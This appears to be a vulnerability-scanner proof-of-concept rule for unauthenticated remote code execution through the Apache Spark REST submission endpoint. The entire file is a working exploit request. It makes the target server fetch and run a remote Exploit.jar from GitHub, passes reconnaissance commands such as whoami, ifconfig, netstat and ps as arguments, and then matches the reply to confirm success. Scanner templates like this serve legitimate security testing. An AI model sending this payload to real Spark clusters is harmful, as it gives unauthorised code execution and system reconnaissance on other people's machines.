name: poc-yaml-spark-unauth
rules:
  - method: POST
    path: /v1/submissions/create
    headers:
      Content-Type: application/json
    body: |
      {
        "action": "CreateSubmissionRequest",
        "clientSparkVersion": "2.3.1",
        "appArgs": [
          "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
        ],
        "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
        "environmentVariables": {
          "SPARK_ENV_LOADED": "1"
        },
        "mainClass": "Exploit",
        "sparkProperties": {
          "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
          "spark.driver.supervise": "false",
          "spark.app.name": "Exploit",
          "spark.eventLog.enabled": "true",
          "spark.submit.deployMode": "cluster",
          "spark.master": "spark://1.1.1.1:6066"
        }
      }
    follow_redirects: false
    expression: >
      response.status == 200 && response.body.bcontains(b"success") && response.body.bcontains(b"submissionId") && response.body.bcontains(b"Spark")
detail:
  author: betta(https://github.com/betta-cyber)
  links:
    - https://xz.aliyun.com/t/2490
